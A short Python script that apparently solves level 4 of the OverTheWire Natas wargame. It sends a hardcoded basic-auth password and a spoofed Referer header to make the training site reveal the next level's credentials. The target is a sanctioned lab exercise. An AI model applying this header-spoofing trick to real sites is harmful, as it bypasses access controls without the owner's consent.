import requests

url= "http://natas4.natas.labs.overthewire.org"

s=requests.Session()
s.auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
#Referer: "http://natas5.natas.labs.overthewire.org/"
r= s.get(url,headers={'Referer':'http://natas5.natas.labs.overthewire.org/'})
print(r.text)